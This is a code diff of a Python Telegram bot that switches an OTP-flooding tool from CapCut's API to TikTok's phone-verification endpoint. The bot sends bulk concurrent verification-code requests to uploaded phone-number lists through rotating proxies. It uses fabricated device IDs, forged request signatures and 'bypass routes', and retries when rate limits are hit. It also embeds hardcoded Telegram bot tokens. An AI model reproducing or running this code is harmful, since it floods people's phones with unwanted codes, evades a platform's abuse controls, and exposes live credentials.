@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-CapCut OTP Telegram Bot - Ultra Fast Edition v6.1
+TikTok OTP Telegram Bot - Ultra Fast Edition v6.1
 ==================================================
 Features:
 1. 5-10 Concurrent OTP Requests Per Second
@@ -56,7 +56,7 @@ except ImportError:
 # CONFIGURATION
 # ============================================
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8579853487:AAEPvpJSgXzvcZLLavcV1hjrNr4mIrDZFns")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8755279743:AAGiyCwUCPpXTUOFnEixMeLFyuZANYFwE9Y")
 
 # Pakistan Timezone
 PAKISTAN_TZ = pytz.timezone('Asia/Karachi')
@@ -69,9 +69,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Performance settings - ULTRA FAST
-MAX_CONCURRENT_OTP = 500          # 5 concurrent OTP requests at once
+MAX_CONCURRENT_OTP = 50          # 5 concurrent OTP requests at once
 MAX_CONCURRENT_TASKS = 100       # Support 100+ concurrent tasks
-BATCH_SIZE = 500                  # Process 5 numbers at a time
+BATCH_SIZE = 100                  # Process 5 numbers at a time
 LOG_INTERVAL = 50                # Log every 5 requests
 MAX_MESSAGE_LENGTH = 4000
 REQUEST_TIMEOUT = 15             # 15 second timeout per request
@@ -109,6 +109,23 @@ class GlobalStats:
 global_stats = GlobalStats()
 
 # ============================================
+# ALL CONFIRMED WORKING BYPASS ROUTES (TIKTOK)
+# ============================================
+
+WORKING_ROUTES = [
+    {"aid": 1180, "app_name": "musical_ly", "label": "TikTok Global", "vc": "330204", "vn": "33.2.4", "mvc": "2023302040", "uvc": "2023302040", "ch": "googleplay", "ua_pkg": "com.zhiliaoapp.musically",
+     "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-c-useast1a.tiktokv.com", "api16-va.tiktokv.com", "api-va.tiktokv.com"]},
+    
+    {"aid": 1233, "app_name": "musical_ly", "label": "TikTok Musical.ly", "vc": "330204", "vn": "33.2.4", "mvc": "2023302040", "uvc": "2023302040", "ch": "googleplay", "ua_pkg": "com.zhiliaoapp.musically",
+     "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-c-useast1a.tiktokv.com", "api16-va.tiktokv.com", "api-va.tiktokv.com"]},
+    
+    {"aid": 1340, "app_name": "tiktok_lite", "label": "TikTok Lite", "vc": "330204", "vn": "33.2.4", "mvc": "2023302040", "uvc": "2023302040", "ch": "googleplay", "ua_pkg": "com.zhiliaoapp.musically",
+     "domains": ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-c-useast1a.tiktokv.com", "api16-va.tiktokv.com", "api-va.tiktokv.com"]},
+]
+
+BYPASS_ENDPOINT = "/passport/mobile/send_code/v1/"
+
+# ============================================
 # PROFESSIONAL DEVICE ID GENERATOR
 # ============================================
 
@@ -130,22 +147,13 @@ class DeviceIdentityGenerator:
         "Tecno": ["CK7n", "CK8n", "CK9n", "CH9n", "CL8", "CL7n", "CK6n", "CH7n", "CK8", "CL6"],
     }
     
-    GPU_RENDERS = [
-        "Mali-G57", "Mali-G68", "Mali-G77", "Mali-G78", "Mali-G710", "Mali-G715",
-        "Adreno 619", "Adreno 642L", "Adreno 650", "Adreno 660", "Adreno 730", "Adreno 740",
-        "PowerVR GE8320", "PowerVR GM9446", "IMG BXM-8-256",
-    ]
-    
-    ANDROID_VERSIONS = ["11", "12", "12L", "13", "14", "15"]
-    API_LEVELS = {"11": "30", "12": "31", "12L": "32", "13": "33", "14": "34", "15": "35"}
+    ANDROID_VERSIONS = ["10", "11", "12", "13", "14"]
+    API_LEVELS = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}
     
     BUILD_IDS = [
-        "TP1A.220624.014", "SP1A.210812.016", "RQ3A.211001.001", "SQ3A.220705.003",
-        "TQ3A.230901.001", "UP1A.231005.007", "AP3A.240905.015", "BP1A.250305.019",
+        "AP3A.240905.015.A2", "TP1A.220624.014", "SP1A.210812.016", "RQ3A.211001.001",
+        "SQ3A.220705.003", "TQ3A.230901.001", "UP1A.231005.007"
     ]
-    
-    CRONET_VERSIONS = ["01594da2_2023-03-14", "02785bc3_2023-06-20", "03896cd4_2023-09-15"]
-    TTNET_VERSIONS = ["4.1.130.2-tudp", "4.1.131.5-tudp", "4.1.132.8-tudp"]
     
     def __init__(self):
         self.used_device_ids: Set[str] = set()
@@ -155,12 +163,12 @@ class DeviceIdentityGenerator:
     
     def _generate_unique_19_digit_id(self, used_set: Set[str]) -> str:
         for _ in range(100):
-            prefix = random.choice(["69", "70", "71", "72", "73", "74", "75", "76", "77", "78"])
-            device_id = prefix + ''.join(random.choices(string.digits, k=17))
+            prefix = random.choice(["6", "7"])
+            device_id = prefix + ''.join(random.choices(string.digits, k=18))
             if device_id not in used_set:
                 used_set.add(device_id)
                 return device_id
-        fallback_id = prefix + str(uuid.uuid4().int)[:17]
+        fallback_id = prefix + str(uuid.uuid4().int)[:18]
         used_set.add(fallback_id)
         return fallback_id
     
@@ -177,32 +185,17 @@ class DeviceIdentityGenerator:
         iid = self._generate_unique_19_digit_id(self.used_iids)
         openudid = ''.join(random.choices('0123456789abcdef', k=16))
         cdid = str(uuid.uuid4())
-        did = f"00000000-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-ffff-ffff{uuid.uuid4().hex[:8]}"
-        
-        gpu_render = random.choice(self.GPU_RENDERS)
         build_id = random.choice(self.BUILD_IDS)
-        cronet_version = random.choice(self.CRONET_VERSIONS)
-        ttnet_version = random.choice(self.TTNET_VERSIONS)
         
         resolutions = ["1080*2400", "1080*2340", "1080*2436", "1440*3200", "1080*2520", "720*1600"]
         resolution = random.choice(resolutions)
         dpi = random.choice(["420", "440", "480", "560", "640"])
-        total_memory = str(random.randint(4000, 12000))
-        available_memory = str(random.randint(1000, 4000))
-        
-        ms_token_base = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
-        ms_token = f"CmAdOS08A7OC5uDiAzJEpwrlDz1CC_{ms_token_base}="
-        odin_tt = ''.join(random.choices('0123456789abcdef', k=128))
-        csrf_token = ''.join(random.choices('0123456789abcdef', k=32))
         
         return {
-            "device_id": device_id, "iid": iid, "openudid": openudid, "cdid": cdid, "did": did,
+            "device_id": device_id, "iid": iid, "openudid": openudid, "cdid": cdid,
             "device_type": model, "device_brand": brand, "model": model, "manu": brand.upper(),
-            "gpu_render": gpu_render, "os_api": api_level, "os_version": android_version,
-            "resolution": resolution, "dpi": dpi, "total_memory": total_memory,
-            "available_memory": available_memory, "build_id": build_id,
-            "cronet_version": cronet_version, "ttnet_version": ttnet_version,
-            "ms_token": ms_token, "odin_tt": odin_tt, "csrf_token": csrf_token,
+            "os_api": api_level, "os_version": android_version,
+            "resolution": resolution, "dpi": dpi, "build_id": build_id,
             "generation_number": self.generation_count,
         }
     
@@ -215,28 +208,18 @@ class DeviceIdentityGenerator:
 
 
 # ============================================
-# CAPCUT OTP SENDER (ORIGINAL WORKING LOGIC)
+# TIKTOK OTP SENDER (WORKING BYPASS LOGIC)
 # ============================================
 
-class CapCutOTPSender:
-    """CapCut OTP Sender with SignerPy signatures - Original Working Logic"""
+class TikTokOTPSender:
+    """TikTok OTP Sender with SignerPy signatures - Working Bypass Logic"""
     
-    BASE_URL = "https://passport16-normal-sg.capcutapi.com"
     ENDPOINT = "/passport/mobile/send_code/v1/"
-    
-    BASE_CONFIG = {
-        "app_name": "vicut", "aid": 3006, "version_code": "9200400", "version_name": "9.3.0",
-        "manifest_version_code": "9300200", "update_version_code": "9200400",
-        "app_sdk_version": "83.0.0", "passport_sdk_version": "30876",
-        "effect_sdk_version": "14.9.0", "os": "android", "device_platform": "android",
-        "channel": "googleplay", "carrier_region": "US", "mcc_mnc": "310160",
-        "region": "US", "language": "en", "ac": "wifi", "ssmix": "a",
-        "subdivision_id": "US-CA", "user_type": "0",
-    }
     
     def __init__(self, identity_generator: DeviceIdentityGenerator):
         self.identity_generator = identity_generator
         self.current_identity = None
+        self.current_route = None
     
     def _create_session(self, proxy: Optional[str] = None) -> requests.Session:
         session = requests.Session()
@@ -250,188 +233,155 @@ class CapCutOTPSender:
         self.current_identity = self.identity_generator.generate_fresh_identity()
         return self.current_identity
     
-    def _get_config(self) -> Dict:
-        if not self.current_identity:
-            self.refresh_identity()
-        config = self.BASE_CONFIG.copy()
-        config.update({
-            "device_id": self.current_identity["device_id"],
-            "iid": self.current_identity["iid"],
-            "openudid": self.current_identity["openudid"],
-            "cdid": self.current_identity["cdid"],
-            "did": self.current_identity["did"],
-            "device_type": self.current_identity["device_type"],
-            "device_brand": self.current_identity["device_brand"],
-            "model": self.current_identity["model"],
-            "manu": self.current_identity["manu"],
-            "gpu_render": self.current_identity["gpu_render"],
-            "os_api": self.current_identity["os_api"],
-            "os_version": self.current_identity["os_version"],
-            "resolution": self.current_identity["resolution"],
-            "dpi": self.current_identity["dpi"],
-            "total_memory": self.current_identity["total_memory"],
-            "available_memory": self.current_identity["available_memory"],
-            "cronet_version": self.current_identity["cronet_version"],
-            "ttnet_version": self.current_identity["ttnet_version"],
-        })
-        return config
-    
-    def _get_cookies(self) -> Dict:
-        if not self.current_identity:
-            self.refresh_identity()
-        return {
-            "odin_tt": self.current_identity["odin_tt"],
-            "msToken": self.current_identity["ms_token"],
-            "passport_csrf_token": self.current_identity["csrf_token"],
-            "passport_csrf_token_default": self.current_identity["csrf_token"],
-            "store-idc": "alisg",
-        }
+    def select_route(self) -> Dict:
+        """Select a random working route"""
+        self.current_route = random.choice(WORKING_ROUTES)
+        return self.current_route
     
     def _encrypt_phone(self, phone_number: str) -> str:
         if SIGNERPY_AVAILABLE:
             return xor(phone_number)
+        # Fallback simple XOR
         encrypted = ""
         for char in phone_number:
             encrypted_byte = ord(char) ^ 5
             encrypted += format(encrypted_byte, '02x')
         return encrypted
     
-    def _encode_base64(self, text: str) -> str:
-        return base64.b64encode(text.encode()).decode()
-    
-    def _build_url_params(self, config: Dict, timestamp: int) -> str:
+    def _build_url_params(self, route: Dict, identity: Dict, timestamp: int) -> str:
         rticket = str(timestamp * 1000 + random.randint(0, 999))
         params = {
-            "passport-sdk-version": config["passport_sdk_version"],
-            "iid": config["iid"], "device_id": config["device_id"],
-            "ac": config["ac"], "channel": config["channel"],
-            "aid": str(config["aid"]), "app_name": config["app_name"],
-            "version_code": config["version_code"], "version_name": config["version_name"],
-            "device_platform": config["device_platform"], "os": config["os"],
-            "ssmix": config["ssmix"], "device_type": config["device_type"],
-            "device_brand": config["device_brand"], "language": config["language"],
-            "os_api": config["os_api"], "os_version": config["os_version"],
-            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
-            "resolution": config["resolution"], "dpi": config["dpi"],
-            "update_version_code": config["update_version_code"], "_rticket": rticket,
-            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
-            "region": config["region"], "cdid": config["cdid"],
-            "effect_sdk_version": config["effect_sdk_version"],
-            "subdivision_id": config["subdivision_id"], "user_type": config["user_type"],
-            "cronet_version": config["cronet_version"], "ttnet_version": config["ttnet_version"],
-            "use_store_region_cookie": "1",
+            "passport-sdk-version": "5040090",
+            "device_id": identity["device_id"],
+            "ac": "mobile",
+            "channel": route["ch"],
+            "aid": str(route["aid"]),
+            "app_name": route["app_name"],
+            "version_code": route["vc"],
+            "version_name": route["vn"],
+            "device_platform": "android",
+            "ssmix": "a",
+            "device_type": identity["device_type"],
+            "device_brand": identity["device_brand"],
+            "language": "en",
+            "os_api": identity["os_api"],
+            "os_version": identity["os_version"],
+            "manifest_version_code": route["mvc"],
+            "resolution": identity["resolution"],
+            "dpi": identity["dpi"],
+            "update_version_code": route["uvc"],
+            "_rticket": rticket,
+            "cdid": identity["cdid"],
+            "sys_region": "US",
+            "sys_language": "en",
+            "locale": "en",
+            "carrier_region": "af",
+            "mcc_mnc": "41220",
+            "region": "AF",
         }
         return urlencode(params)
     
-    def _build_body(self, phone_number: str, config: Dict, timestamp: int) -> str:
+    def _build_body(self, phone_number: str, route: Dict, identity: Dict, timestamp: int) -> str:
         encrypted_mobile = self._encrypt_phone(phone_number)
-        rticket = str(timestamp * 1000 + random.randint(0, 999))
         params = {
-            "auto_read": "1", "account_sdk_source": "app", "unbind_exist": "35",
-            "mix_mode": "1", "mobile": encrypted_mobile, "is6Digits": "1", "type": "3734",
-            "iid": config["iid"], "device_id": config["device_id"],
-            "ac": config["ac"], "channel": config["channel"],
-            "aid": str(config["aid"]), "app_name": config["app_name"],
-            "version_code": config["version_code"], "version_name": config["version_name"],
-            "device_platform": config["device_platform"], "os": config["os"],
-            "ssmix": config["ssmix"], "device_type": config["device_type"],
-            "device_brand": config["device_brand"], "language": config["language"],
-            "os_api": config["os_api"], "os_version": config["os_version"],
-            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
-            "resolution": config["resolution"], "dpi": config["dpi"],
-            "update_version_code": config["update_version_code"], "_rticket": rticket,
-            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
-            "region": config["region"], "cdid": config["cdid"],
+            "auto_read": "1",
+            "account_sdk_source": "app",
+            "unbind_exist": "35",
+            "mix_mode": "1",
+            "mobile": encrypted_mobile,
+            "multi_login": "1",
+            "type": "3734"
         }
         return urlencode(params)
     
-    def _build_cookie_string(self, cookies: Dict) -> str:
-        return "; ".join([f"{k}={v}" for k, v in cookies.items()])
-    
-    def _generate_signatures(self, url_params: str, body: str, cookie: str, config: Dict) -> Dict:
+    def _generate_signatures(self, url_params: str, body: str, aid: int) -> Dict:
         if not SIGNERPY_AVAILABLE:
             raise Exception("SignerPy library not available!")
-        return sign(params=url_params, payload=body, cookie=cookie, version=8404, aid=config["aid"])
+        return sign(params=url_params, payload=body, cookie="", version=8404, aid=aid)
     
-    def _build_headers(self, config: Dict, cookies: Dict, timestamp: int, signatures: Dict) -> Dict:
+    def _build_headers(self, route: Dict, identity: Dict, domain: str, timestamp: int, signatures: Dict) -> Dict:
         return {
-            "Host": "passport16-normal-sg.capcutapi.com",
+            "Host": domain,
             "Connection": "keep-alive",
-            "Cookie": self._build_cookie_string(cookies),
-            "lan": "en", "loc": "ae", "pf": "0", "vr": "277884928", "appvr": "16.8.1",
-            "vc": config["version_code"], "device-time": str(timestamp),
-            "tdid": config["device_id"], "sign-ver": "1",
-            "sign": hashlib.md5(f"{timestamp}{config['device_id']}".encode()).hexdigest(),
-            "app-sdk-version": config["app_sdk_version"], "appid": str(config["aid"]),
-            "header-content": f"ode/v1/|0|9.2.0|{timestamp}|{config['device_id']}",
-            "host-abi": "64", "cc-newuser-channel": "common", "Cache-Control": "no-cache",
-            "sysvr": config["os_api"], "ch": config["channel"], "uid": "0",
-            "COMPRESSED": "1", "did": config["did"],
-            "model": self._encode_base64(config["model"]),
-            "manu": self._encode_base64(config["manu"]),
-            "GPURender": self._encode_base64(config["gpu_render"]),
-            "HDR-TDID": config["device_id"], "HDR-TIID": config["iid"],
-            "HDR-Device-Time": str(timestamp), "version_code": "277884928",
-            "total-memory": config["total_memory"], "available-memory": config["available_memory"],
-            "HDR-Sign": hashlib.md5(f"{timestamp}{config['iid']}".encode()).hexdigest(),
-            "HDR-Sign-Ver": "1", "x-tt-passport-csrf-token": cookies["passport_csrf_token"],
-            "x-vc-bdturing-sdk-version": "2.3.0.i18n", "sdk-version": "2",
-            "passport-sdk-version": config["passport_sdk_version"],
-            "commerce-sign-version": "v1", "region": config["region"],
+            "X-SS-REQ-TICKET": str(timestamp * 1000 + random.randint(100, 900)),
+            "x-vc-bdturing-sdk-version": "2.2.1.i18n",
+            "sdk-version": "2",
+            "passport-sdk-version": "5040090",
+            "oec-vc-sdk-version": "3.0.2.i18n",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "X-SS-STUB": signatures.get("x-ss-stub", ""),
-            "X-SS-DP": str(config["aid"]),
-            "x-tt-trace-id": trace_id(device_id=config["device_id"]) if SIGNERPY_AVAILABLE else "",
-            "User-Agent": f"com.lemon.lvoverseas/{config['manifest_version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{self.current_identity.get('build_id', 'AP3A.240905.015.A2')}; Cronet/TTNetVersion:{config['cronet_version'].split('_')[0]} {config['cronet_version'].split('_')[1]} QuicVersion:46688bb4 2022-11-28)",
-            "Accept-Encoding": "gzip, deflate",
+            "x-tt-trace-id": trace_id(device_id=identity["device_id"]) if SIGNERPY_AVAILABLE else "",
+            "X-Argus": signatures.get("x-argus", ""),
             "X-Gorgon": signatures.get("x-gorgon", ""),
             "X-Khronos": signatures.get("x-khronos", ""),
-            "X-Argus": signatures.get("x-argus", ""),
             "X-Ladon": signatures.get("x-ladon", ""),
+            "User-Agent": f"{route['ua_pkg']}/{route['vc']} (Linux; U; Android {identity['os_version']}; en_US; {identity['device_type']}; Build/{identity['build_id']}; Cronet/TTNetVersion:73a761fd 2024-06-12 QuicVersion:46688bb4 2022-11-28)"
         }
     
     def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None) -> Dict:
-        """Synchronous OTP send - Original Working Logic"""
+        """Synchronous OTP send - TikTok Working Bypass Logic"""
         phone = phone_number.strip().replace(" ", "").replace("-", "")
         if not phone.startswith("+"):
             phone = "+" + phone
         
         start_time = time.time()
         
-        # Refresh identity for each request
+        # Refresh identity and select route for each request
         self.refresh_identity()
-        
-        config = self._get_config()
-        cookies = self._get_cookies()
+        route = self.select_route()
+        domain = random.choice(route["domains"])
         timestamp = int(time.time())
         
-        url_params = self._build_url_params(config, timestamp)
-        body = self._build_body(phone, config, timestamp)
-        cookie_str = self._build_cookie_string(cookies)
+        url_params = self._build_url_params(route, self.current_identity, timestamp)
+        body = self._build_body(phone, route, self.current_identity, timestamp)
         
         try:
-            signatures = self._generate_signatures(url_params, body, cookie_str, config)
+            signatures = self._generate_signatures(url_params, body, route["aid"])
         except Exception as e:
             return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
         
-        headers = self._build_headers(config, cookies, timestamp, signatures)
-        url = f"{self.BASE_URL}{self.ENDPOINT}?{url_params}"
+        headers = self._build_headers(route, self.current_identity, domain, timestamp, signatures)
+        url = f"https://{domain}{self.ENDPOINT}?{url_params}"
         
         session = self._create_session(proxy)
         
         try:
             response = session.post(url, data=body, headers=headers, timeout=15)
             elapsed = (time.time() - start_time) * 1000
-            try:
-                result = response.json()
-                result["success"] = result.get("message") == "success"
-                result["proxy_used"] = proxy or "Direct"
-                result["device_id"] = config["device_id"]
-                result["time_ms"] = elapsed
-                result["phone"] = phone
-                return result
-            except json.JSONDecodeError:
-                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
+            
+            # Check response
+            response_text = response.text
+            
+            if '"message":"success"' in response_text:
+                return {
+                    "success": True,
+                    "message": "success",
+                    "proxy_used": proxy or "Direct",
+                    "device_id": self.current_identity["device_id"],
+                    "time_ms": elapsed,
+                    "phone": phone,
+                    "route": route["label"],
+                    "aid": route["aid"]
+                }
+            elif "maximum" in response_text.lower():
+                return {
+                    "success": False,
+                    "error": "Rate limited (maximum requests)",
+                    "proxy_used": proxy or "Direct",
+                    "time_ms": elapsed,
+                    "phone": phone,
+                    "route": route["label"]
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": response_text[:200],
+                    "proxy_used": proxy or "Direct",
+                    "time_ms": elapsed,
+                    "phone": phone,
+                    "route": route["label"]
+                }
+                
         except requests.exceptions.RequestException as e:
             elapsed = (time.time() - start_time) * 1000
             return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
@@ -613,19 +563,19 @@ async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Sema
         proxy = random.choice(proxies) if proxies else None
         
         # Create a new sender instance for thread safety
-        sender = CapCutOTPSender(identity_generator)
+        sender = TikTokOTPSender(identity_generator)
         
         # Run blocking OTP send in thread pool
         result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
         
         # Retry on failure
         if not result.get("success"):
-            error_desc = str(result.get("data", {}).get("description", result.get("error", ""))).lower()
+            error_desc = str(result.get("error", "")).lower()
             limit_keywords = ["limit", "frequency", "maximum", "too many", "often", "error", "timeout"]
             
             if any(kw in error_desc for kw in limit_keywords):
                 proxy = random.choice(proxies) if proxies else None
-                sender2 = CapCutOTPSender(identity_generator)
+                sender2 = TikTokOTPSender(identity_generator)
                 result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
         
         await global_stats.increment(result.get("success", False))
@@ -640,39 +590,39 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pk_time = get_pakistan_time().strftime("%I:%M %p PKT")
     
     keyboard = [
-        [InlineKeyboardButton("ðŸ“¦ Bulk OTP", callback_data="bulk"), InlineKeyboardButton("ðŸ“± Single OTP", callback_data="single")],
-        [InlineKeyboardButton("ðŸ“ Upload Numbers", callback_data="upload_numbers"), InlineKeyboardButton("ðŸ”’ Upload Proxies", callback_data="upload_proxies")],
-        [InlineKeyboardButton("â° Schedule Task", callback_data="schedule"), InlineKeyboardButton("ðŸ“‹ Scheduled", callback_data="scheduled_list")],
-        [InlineKeyboardButton("ðŸ“Š Status", callback_data="status"), InlineKeyboardButton("ðŸ”„ Tasks", callback_data="tasks")],
-        [InlineKeyboardButton("ðŸ“ˆ Global Stats", callback_data="global_stats")],
+        [InlineKeyboardButton("📦 Bulk OTP", callback_data="bulk"), InlineKeyboardButton("📱 Single OTP", callback_data="single")],
+        [InlineKeyboardButton("📁 Upload Numbers", callback_data="upload_numbers"), InlineKeyboardButton("🔒 Upload Proxies", callback_data="upload_proxies")],
+        [InlineKeyboardButton("⏰ Schedule Task", callback_data="schedule"), InlineKeyboardButton("📋 Scheduled", callback_data="scheduled_list")],
+        [InlineKeyboardButton("📊 Status", callback_data="status"), InlineKeyboardButton("🔄 Tasks", callback_data="tasks")],
+        [InlineKeyboardButton("📈 Global Stats", callback_data="global_stats")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     msg = f"""
-ðŸš€ <b>CapCut OTP Bot - Ultra Fast v6.1</b>
+🚀 <b>TikTok OTP Bot - Ultra Fast v6.1</b>
 
-âš¡ <b>Performance:</b>
-â€¢ 5-10 Concurrent OTP/Second
-â€¢ 100+ Concurrent Tasks
-â€¢ Zero Blocking - Instant Response
-â€¢ Multi-User Support (1000+ Users)
+⚡ <b>Performance:</b>
+• 5-10 Concurrent OTP/Second
+• 100+ Concurrent Tasks
+• Zero Blocking - Instant Response
+• Multi-User Support (1000+ Users)
 
-ðŸ• <b>Time:</b> {pk_time}
+🕐 <b>Time:</b> {pk_time}
 
-<b>ðŸ“± Single OTP:</b>
+<b>📱 Single OTP:</b>
 <code>/single +923099003842</code>
 
-<b>ðŸ“¦ Bulk OTP:</b>
+<b>📦 Bulk OTP:</b>
 /bulk - Start bulk task
 
-<b>â° Schedule Task:</b>
+<b>⏰ Schedule Task:</b>
 <code>/schedule 14:30</code> - Schedule at 2:30 PM
 
-<b>ðŸ“ File Upload:</b>
+<b>📁 File Upload:</b>
 /uploadnumbers - Upload TXT/CSV
 /uploadproxies - Upload proxies
 
-<b>ðŸ”§ Commands:</b>
+<b>🔧 Commands:</b>
 /status - Bot status
 /tasks - Active tasks
 /scheduled - Scheduled tasks
@@ -697,30 +647,30 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     scheduled_count = len([s for s in task_manager.get_all_scheduled_tasks() if s.status == "pending"])
     
     msg = f"""
-ðŸ“Š <b>Bot Status</b>
+📊 <b>Bot Status</b>
 
-ðŸ¤– <b>Bot:</b> Online âœ…
-ðŸ“¦ <b>SignerPy:</b> {'âœ… Available' if SIGNERPY_AVAILABLE else 'âŒ Missing'}
-ðŸ• <b>Pakistan Time:</b> {pk_time}
+🤖 <b>Bot:</b> Online ✅
+📦 <b>SignerPy:</b> {'✅ Available' if SIGNERPY_AVAILABLE else '❌ Missing'}
+🕐 <b>Pakistan Time:</b> {pk_time}
 
-âš¡ <b>Performance:</b>
-â€¢ Max Concurrent OTP: {MAX_CONCURRENT_OTP}
-â€¢ Max Concurrent Tasks: {MAX_CONCURRENT_TASKS}
-â€¢ Batch Size: {BATCH_SIZE}
+⚡ <b>Performance:</b>
+• Max Concurrent OTP: {MAX_CONCURRENT_OTP}
+• Max Concurrent Tasks: {MAX_CONCURRENT_TASKS}
+• Batch Size: {BATCH_SIZE}
 
-ðŸ”¢ <b>Your Data:</b>
-â€¢ Numbers: {numbers_count:,}
-â€¢ Proxies: {proxies_count:,}
+🔢 <b>Your Data:</b>
+• Numbers: {numbers_count:,}
+• Proxies: {proxies_count:,}
 
-ðŸ“‹ <b>Tasks:</b>
-â€¢ Running: {running}
-â€¢ Scheduled: {scheduled_count}
-â€¢ Generated IDs: {stats['total_generated']:,}
+📋 <b>Tasks:</b>
+• Running: {running}
+• Scheduled: {scheduled_count}
+• Generated IDs: {stats['total_generated']:,}
 
-ðŸ“ˆ <b>Global Stats:</b>
-â€¢ Total Requests: {g_stats['total_requests']:,}
-â€¢ Success: {g_stats['total_success']:,}
-â€¢ Failed: {g_stats['total_failed']:,}
+📈 <b>Global Stats:</b>
+• Total Requests: {g_stats['total_requests']:,}
+• Success: {g_stats['total_success']:,}
+• Failed: {g_stats['total_failed']:,}
 """
     await update.message.reply_text(msg, parse_mode="HTML")
 
@@ -732,15 +682,15 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
     
     msg = f"""
-ðŸ“ˆ <b>Global Statistics</b>
+📈 <b>Global Statistics</b>
 
-ðŸ”¢ <b>Total Requests:</b> {g_stats['total_requests']:,}
-âœ… <b>Success:</b> {g_stats['total_success']:,}
-âŒ <b>Failed:</b> {g_stats['total_failed']:,}
-ðŸ“Š <b>Success Rate:</b> {success_rate:.1f}%
+🔢 <b>Total Requests:</b> {g_stats['total_requests']:,}
+✅ <b>Success:</b> {g_stats['total_success']:,}
+❌ <b>Failed:</b> {g_stats['total_failed']:,}
+📊 <b>Success Rate:</b> {success_rate:.1f}%
 
-â± <b>Uptime:</b> {uptime_mins:.1f} minutes
-ðŸš€ <b>Requests/Minute:</b> {g_stats['requests_per_minute']:.1f}
+⏱ <b>Uptime:</b> {uptime_mins:.1f} minutes
+🚀 <b>Requests/Minute:</b> {g_stats['requests_per_minute']:.1f}
 """
     await update.message.reply_text(msg, parse_mode="HTML")
 
@@ -754,7 +704,7 @@ async def single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         user_states[user_id]['awaiting'] = 'single_phone'
         await update.message.reply_text(
-            "ðŸ“± <b>Single OTP</b>\n\n"
+            "📱 <b>Single OTP</b>\n\n"
             "Usage: <code>/single +923099003842</code>\n"
             "Or: <code>/single +923099003842 proxy:port</code>",
             parse_mode="HTML"
@@ -767,7 +717,7 @@ async def bulk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not numbers:
         await update.message.reply_text(
-            "âŒ <b>No numbers loaded!</b>\n\n"
+            "❌ <b>No numbers loaded!</b>\n\n"
             "Use /setnumbers or /uploadnumbers first.",
             parse_mode="HTML"
         )
@@ -784,7 +734,7 @@ async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not numbers:
         await update.message.reply_text(
-            "âŒ <b>No numbers loaded!</b>\n\n"
+            "❌ <b>No numbers loaded!</b>\n\n"
             "Use /setnumbers or /uploadnumbers first.",
             parse_mode="HTML"
         )
@@ -792,7 +742,7 @@ async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not context.args:
         await update.message.reply_text(
-            "â° <b>Schedule Task</b>\n\n"
+            "⏰ <b>Schedule Task</b>\n\n"
             "Usage: <code>/schedule HH:MM</code>\n"
             "Example: <code>/schedule 14:30</code> (2:30 PM)\n\n"
             "Time is in Pakistan timezone (PKT)",
@@ -805,7 +755,7 @@ async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not scheduled_time:
         await update.message.reply_text(
-            "âŒ <b>Invalid time format!</b>\n\n"
+            "❌ <b>Invalid time format!</b>\n\n"
             "Use: <code>/schedule HH:MM</code>\n"
             "Example: <code>/schedule 14:30</code>",
             parse_mode="HTML"
@@ -821,11 +771,11 @@ async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_scheduled_task(context, schedule_id))
     
     await update.message.reply_text(
-        f"â° <b>Task Scheduled!</b>\n\n"
-        f"ðŸ†” ID: {schedule_id}\n"
-        f"ðŸ“± Numbers: {len(numbers):,}\n"
-        f"ðŸ”’ Proxies: {len(proxies):,}\n"
-        f"ðŸ• Time: {scheduled_time.strftime('%I:%M %p PKT')}\n\n"
+        f"⏰ <b>Task Scheduled!</b>\n\n"
+        f"🆔 ID: {schedule_id}\n"
+        f"📱 Numbers: {len(numbers):,}\n"
+        f"🔒 Proxies: {len(proxies):,}\n"
+        f"🕐 Time: {scheduled_time.strftime('%I:%M %p PKT')}\n\n"
         f"Use /cancelschedule {schedule_id} to cancel.",
         parse_mode="HTML"
     )
@@ -837,14 +787,14 @@ async def scheduled_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pending = [s for s in scheduled_tasks if s.status == "pending"]
     
     if not pending:
-        await update.message.reply_text("ðŸ“‹ No scheduled tasks.", parse_mode="HTML")
+        await update.message.reply_text("📋 No scheduled tasks.", parse_mode="HTML")
         return
     
-    msg = "â° <b>Scheduled Tasks:</b>\n\n"
+    msg = "⏰ <b>Scheduled Tasks:</b>\n\n"
     for task in pending[-10:]:
-        msg += f"ðŸ†” {task.schedule_id}\n"
